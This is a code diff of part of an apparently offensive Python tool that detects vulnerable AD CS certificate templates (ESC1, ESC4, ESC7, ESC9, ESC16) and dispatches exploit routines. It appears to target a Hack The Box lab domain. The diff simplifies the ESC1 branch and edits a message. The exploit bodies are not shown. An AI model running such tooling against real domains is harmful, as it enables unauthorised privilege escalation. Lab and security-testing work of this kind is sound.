@@ -37,25 +37,15 @@ def main():
     if esc1_templates:
         template = esc1_templates[0]
         print(f"[+] Detected ESC1 on template: {template['template_name']}")
-        if "AUTHORITY.HTB\\Domain Computers" in output:
-            print("[+] Template allows Domain Computers enrollment - using computer account method")
-            exploit_esc1_domain_computer(
-                username=args.username,
-                password=args.password,
-                domain=args.domain,
-                dc_ip=args.dc_ip,
-                ca_name=template["ca_name"],
-                template_name=template["template_name"]
-            )
-        else:
-            exploit_esc1(
-                username=args.username,
-                password=args.password,
-                domain=args.domain,
-                dc_ip=args.dc_ip,
-                ca_name=template["ca_name"],
-                template_name=template["template_name"]
-            )
+        exploit_esc1(
+            username=args.username,
+            password=args.password,
+            domain=args.domain,
+            dc_ip=args.dc_ip,
+            ca_name=template["ca_name"],
+            template_name=template["template_name"],
+            output=output
+        )
     elif esc4_templates:
         template = esc4_templates[0]
         print(f"[+] Detected ESC4 on template: {template['template_name']}")
@@ -99,7 +89,7 @@ def main():
             ca_name=ca["ca_name"]
         )
     else:
-        print("[!] No exploitable templates (ESC1, ESC4, ESC7, ESC9, or ESC16) found.")
+        print(f"[!] No exploitable templates (ESC1, ESC4, ESC7, ESC9, or ESC16) found in domain {args.domain}.")
 
 if __name__ == "__main__":
     main()
